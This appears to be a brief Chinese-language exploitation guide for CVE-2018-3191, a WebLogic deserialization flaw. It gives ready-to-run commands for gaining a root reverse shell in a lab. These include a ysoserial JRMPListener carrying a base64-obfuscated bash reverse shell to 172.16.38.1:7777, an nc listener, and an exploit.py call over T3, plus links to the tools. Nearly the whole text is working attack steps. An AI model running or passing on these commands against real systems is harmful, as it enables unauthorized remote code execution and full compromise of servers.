# CVE-2018-3191
CVE-2018-3191 反弹shell
本地ip：172.16.38.1
Weblogic：172.16.38.174:7001
1、	本地执行
java -cp ysoserial-master.jar ysoserial.exploit.JRMPListener 2222 CommonsCollections1 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMTYuMzguMS83Nzc3IDA+JjE=}|{base64,-d}|{bash,-i}'
 
然后执行 nc -lvv 7777
 
（1）	其中的 bash 命令为避免Runtime.getRuntime().exec() 执行过程中将特殊符号转义，进行了base64转码解码的操作，明文为 bash -i >& /dev/tcp/172.16.38.1/7777 0>&1
（2）	此操作在本地监听一个JRMPListener，接收被攻击的weblogic 的请求，并执行指定的bash 反弹命令。
（3）	Nc 监听7777等待weblogic 主机反弹bash连接。
2、	执行
python exploit.py 172.16.38.247 7001 weblogic-spring-jndi-10.3.6.0.jar 172.16.38.1 2222，利用漏洞使weblogic 访问远程rmi服务，并执行bash反弹命令。
 

3、	nc监听的端口收到反弹的bash，root权限。
 
攻击所需工具：
ysoserial-master.jar //反序列化利用工具https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
weblogic-spring-jndi-10.3.6.0.jar // CVE-2018-3191 payload生成工具
https://github.com/voidfyoo/CVE-2018-3191/releases
exploit.py //weblogic t3协议发送工具，集成CVE-2018-3191 payload
